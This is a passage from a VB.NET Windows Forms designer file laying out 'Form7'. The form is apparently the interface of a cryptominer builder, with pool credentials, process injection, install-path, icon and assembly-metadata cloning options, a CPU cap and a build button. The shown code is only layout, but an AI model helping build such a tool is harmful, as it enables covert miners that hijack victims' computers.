        'ProgressBar10
        '
        Me.ProgressBar10.ForeColor = System.Drawing.Color.RoyalBlue
        Me.ProgressBar10.Location = New System.Drawing.Point(157, 6)
        Me.ProgressBar10.Name = "ProgressBar10"
        Me.ProgressBar10.Size = New System.Drawing.Size(255, 22)
        Me.ProgressBar10.TabIndex = 43
        '
        'Label3
        '
        Me.Label3.AutoSize = True
        Me.Label3.ForeColor = System.Drawing.Color.RoyalBlue
        Me.Label3.Location = New System.Drawing.Point(6, 6)
        Me.Label3.Margin = New System.Windows.Forms.Padding(2, 0, 2, 0)
        Me.Label3.Name = "Label3"
        Me.Label3.Size = New System.Drawing.Size(69, 19)
        Me.Label3.TabIndex = 42
        Me.Label3.Text = "Max CPU:"
        '
        'txtMaxCPU
        '
        Me.txtMaxCPU.BackColor = System.Drawing.Color.FromArgb(CType(CType(30, Byte), Integer), CType(CType(32, Byte), Integer), CType(CType(34, Byte), Integer))
        Me.txtMaxCPU.DropDownStyle = System.Windows.Forms.ComboBoxStyle.DropDownList
        Me.txtMaxCPU.FlatStyle = System.Windows.Forms.FlatStyle.Flat
        Me.txtMaxCPU.ForeColor = System.Drawing.Color.RoyalBlue
        Me.txtMaxCPU.FormattingEnabled = True
        Me.txtMaxCPU.Items.AddRange(New Object() {"5%", "10%", "15%", "20%", "25%", "30%", "35%", "40%", "45%", "50%", "55%", "60%", "65%", "70%", "75%", "80%", "85%", "90%", "95%", "100%"})
        Me.txtMaxCPU.Location = New System.Drawing.Point(80, 4)
        Me.txtMaxCPU.Name = "txtMaxCPU"
        Me.txtMaxCPU.Size = New System.Drawing.Size(71, 25)
        Me.txtMaxCPU.TabIndex = 41
        '
        'txtLog
        '
        Me.txtLog.BackColor = System.Drawing.Color.FromArgb(CType(CType(30, Byte), Integer), CType(CType(32, Byte), Integer), CType(CType(34, Byte), Integer))
        Me.txtLog.ForeColor = System.Drawing.Color.RoyalBlue
        Me.txtLog.Location = New System.Drawing.Point(6, 34)
        Me.txtLog.Name = "txtLog"
        Me.txtLog.Size = New System.Drawing.Size(406, 98)
        Me.txtLog.TabIndex = 0
        Me.txtLog.Text = ""
        '
        'BackgroundWorker1
        '
        '
        'BackgroundWorker2
        '
        '
        'Timer1
        '
        '
        'Form7
        '
        Me.AutoScaleDimensions = New System.Drawing.SizeF(6.0!, 13.0!)
        Me.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font
        Me.ClientSize = New System.Drawing.Size(450, 265)
        Me.Controls.Add(Me.AzenisForm1)
        Me.FormBorderStyle = System.Windows.Forms.FormBorderStyle.None
        Me.MinimumSize = New System.Drawing.Size(305, 150)
        Me.Name = "Form7"
        Me.Text = "Form7"
        Me.TransparencyKey = System.Drawing.Color.Fuchsia
        Me.AzenisForm1.ResumeLayout(False)
        CType(Me.PictureBox2, System.ComponentModel.ISupportInitialize).EndInit()
        CType(Me.PictureBox1, System.ComponentModel.ISupportInitialize).EndInit()
        Me.MinerPanel.ResumeLayout(False)
        Me.TabPage1.ResumeLayout(False)
        Me.TabPage1.PerformLayout()
        Me.TabPage2.ResumeLayout(False)
        Me.TabPage2.PerformLayout()
        Me.TabPage3.ResumeLayout(False)
        Me.TabPage3.PerformLayout()
        Me.TabPage4.ResumeLayout(False)
        Me.TabPage4.PerformLayout()
        CType(Me.picIcon, System.ComponentModel.ISupportInitialize).EndInit()
        Me.TabPage5.ResumeLayout(False)
        Me.TabPage5.PerformLayout()
        Me.ResumeLayout(False)

    End Sub

    Friend WithEvents AzenisForm1 As AzenisForm
    Friend WithEvents MinerPanel As TabControl
    Friend WithEvents TabPage1 As TabPage
    Friend WithEvents txtInjection As ComboBox
    Friend WithEvents Label5 As Label
    Friend WithEvents txtPoolURL As TextBox
    Friend WithEvents txtPoolPassowrd As TextBox
    Friend WithEvents txtPoolUsername As TextBox
    Friend WithEvents Label8 As Label
    Friend WithEvents Label7 As Label
    Friend WithEvents Label6 As Label
    Friend WithEvents TabPage2 As TabPage
    Friend WithEvents txtInstallFileName As TextBox
    Friend WithEvents txtInstallPathMain As ComboBox
    Friend WithEvents Label2 As Label
    Friend WithEvents Label1 As Label
    Friend WithEvents TabPage3 As TabPage
    Friend WithEvents num_Assembly4 As TextBox
    Friend WithEvents num_Assembly3 As TextBox
    Friend WithEvents num_Assembly2 As TextBox
    Friend WithEvents num_Assembly1 As TextBox
    Friend WithEvents txtTrademark As TextBox
    Friend WithEvents txtCopyright As TextBox
    Friend WithEvents txtProduct As TextBox
    Friend WithEvents txtCompany As TextBox
    Friend WithEvents txtDescription As TextBox
    Friend WithEvents txtTitle As TextBox
    Friend WithEvents TabPage4 As TabPage
    Friend WithEvents picIcon As PictureBox
    Friend WithEvents txtIconPath As TextBox
    Friend WithEvents TabPage5 As TabPage
    Friend WithEvents ProgressBar10 As ProgressBar
    Friend WithEvents Label3 As Label
    Friend WithEvents txtMaxCPU As ComboBox
    Friend WithEvents txtLog As RichTextBox
    Friend WithEvents btn_assemblyRandom As AzenisButton
    Friend WithEvents btn_assemblyClone As AzenisButton
    Friend WithEvents btnBuild As AzenisButton
    Friend WithEvents BackgroundWorker1 As System.ComponentModel.BackgroundWorker
    Friend WithEvents BackgroundWorker2 As System.ComponentModel.BackgroundWorker
    Friend WithEvents Timer1 As Timer
    Friend WithEvents chkInstall As AzenisCheckbox
    Friend WithEvents chkAssembly As AzenisCheckbox
    Friend WithEvents chkIcon As AzenisCheckbox
    Friend WithEvents btnBrowseIcon As AzenisButton
    Friend WithEvents PictureBox1 As PictureBox
    Friend WithEvents PictureBox2 As PictureBox
End Class
